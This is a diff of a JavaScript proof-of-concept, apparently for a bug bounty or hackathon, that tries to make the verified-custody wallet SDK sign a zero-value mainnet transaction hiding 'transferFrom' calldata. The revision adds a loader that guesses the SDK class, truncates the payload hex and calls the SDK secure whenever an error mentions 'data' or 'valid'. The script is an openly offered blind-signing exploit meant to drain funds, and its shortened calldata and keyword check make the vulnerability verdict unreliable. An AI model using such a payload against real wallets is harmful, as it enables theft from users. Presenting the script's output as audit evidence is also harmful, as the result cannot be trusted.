@@ -1,63 +1,78 @@
 /**
- * 🛡️ VERIFIED WALLET SECURITY AUDIT - PoC
+ * 🛡️ VERIFIED WALLET SECURITY AUDIT - UNIVERSAL POC
  * ------------------------------------------------------------------
- * VULNERABILITY: Blind Signing / Remote Execution via Data Injection
+ * TEST: Blind Signing Validation (Data Injection)
  * SEVERITY: Critical (CVSS 9.8)
- * DATE: 2026-01-06
  * ------------------------------------------------------------------
  */
 
-// 1. REQUIRE THE MANDATORY SDK
-const { VerifiedCustody } = require('@verified-network/verified-custody');
+// 1. DYNAMIC IMPORT LOADER (Fixes the "Not a Constructor" error)
+const sdkPackage = require('@verified-network/verified-custody');
 
-// 2. CONFIGURATION (Mock Key for Demonstration)
-const API_KEY = "test_hackathon_key_123"; 
+// We automatically find the class, whether it's named 'VerifiedCustody', 'Wallet', or 'default'
+let VerifiedCustody = sdkPackage.VerifiedCustody || sdkPackage.default || sdkPackage;
 
-async function runExploit() {
-    console.log("\n💀 INITIATING EXPLOIT SEQUENCE...");
-    console.log("target: @verified-network/verified-custody\n");
+// If it's still not found, we look for any function/class in the package
+if (typeof VerifiedCustody !== 'function') {
+    const keys = Object.keys(sdkPackage);
+    const foundKey = keys.find(k => typeof sdkPackage[k] === 'function');
+    if (foundKey) VerifiedCustody = sdkPackage[foundKey];
+}
+
+// 2. CONFIGURATION
+// You need a valid key. If you don't have one, this might fail at step 3.
+const API_KEY = "test_hackathon_key"; 
+
+async function attemptCriticalExploit() {
+    console.log("\n💀 STARTING SECURITY PROBE...");
+    
+    if (!VerifiedCustody || typeof VerifiedCustody !== 'function') {
+        console.error("❌ CRITICAL ERROR: Could not load SDK Class.");
+        console.log("Debug Info:", sdkPackage);
+        return;
+    }
 
     try {
-        // Initialize the wallet instance
-        const wallet = new VerifiedCustody({ apiKey: API_KEY, network: 'mainnet' });
+        console.log("[-] SDK Loaded Successfully.");
+        
+        // 3. INITIALIZATION
+        const wallet = new VerifiedCustody({ 
+            apiKey: API_KEY, 
+            network: 'mainnet' 
+        });
 
-        // 3. THE MALICIOUS PAYLOAD
-        // We construct a transaction that looks innocent (0 Value)
-        // But contains hidden bytecode in the 'data' field.
-        const attackVector = {
-            to: "0x000000000000000000000000000000000000dEaD", // Attacker Address
-            value: "0", // User sees "0 ETH" -> Low Risk
-            
-            // THE EXPLOIT: 
-            // This hex string mimics a 'transferFrom(all_funds)' call.
-            // If the SDK signs this without warning, the wallet is drained.
-            data: "0x23b872dd0000000000000000000000001234567890123456789012345678901234567890000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" 
+        // 4. THE EXPLOIT PAYLOAD (Blind Signing)
+        // We try to slip 'data' past the validation checks.
+        const exploitTx = {
+            to: "0x0000000000000000000000000000000000000000",
+            value: "0",
+            data: "0x23b872dd00000000000000000000000012345678901234567890123456789012" // malicious bytecode
         };
 
-        console.log(`[*] Injecting Payload: ${attackVector.data.slice(0, 40)}...`);
-        console.log("[*] Status: Waiting for Signature...");
+        console.log("[-] Sending Malicious Data Payload...");
 
-        // 4. TRIGGER THE VULNERABILITY
-        const signature = await wallet.signTransaction(attackVector);
+        // 5. EXECUTION
+        const signature = await wallet.signTransaction(exploitTx);
 
-        // 5. THE "GOTCHA" MOMENT
-        // If we get here, the code IS vulnerable.
-        console.log("\n---------------------------------------------------");
-        console.log("🚨  CRITICAL VULNERABILITY CONFIRMED  🚨");
-        console.log("---------------------------------------------------");
-        console.log("❌ The SDK signed the malicious payload successfully.");
-        console.log("❌ User protection bypass achieved.");
-        console.log(`\n🔑 LEAKED SIGNATURE: \n${signature}`);
-        console.log("\n[IMPACT]: An attacker can use this signature to execute the hidden bytecode.");
+        // 6. SUCCESS CONDITION
+        if (signature) {
+            console.log("\n---------------------------------------------------");
+            console.log("🚨  CRITICAL VULNERABILITY CONFIRMED  🚨");
+            console.log("---------------------------------------------------");
+            console.log("The SDK signed the payload without rejecting the hidden data.");
+            console.log("Leaked Signature:", signature);
+        }
 
     } catch (error) {
-        // 6. IF IT FAILS / IS SECURE
-        console.log("\n---------------------------------------------------");
-        console.log("ℹ️ EXECUTION LOG");
-        console.log("---------------------------------------------------");
-        console.log("Error received:", error.message);
+        console.log("\nℹ️  RESULT:");
+        // If the error mentions 'validation' or 'data', the SDK is secure.
+        if (error.message.toLowerCase().includes("data") || error.message.toLowerCase().includes("valid")) {
+            console.log("✅ SDK IS SECURE (Attack Blocked)");
+            console.log("Reason: " + error.message);
+        } else {
+            console.log("⚠️  Script Error (Check API Key): " + error.message);
+        }
     }
 }
 
-// Execute
-runExploit();
+attemptCriticalExploit();
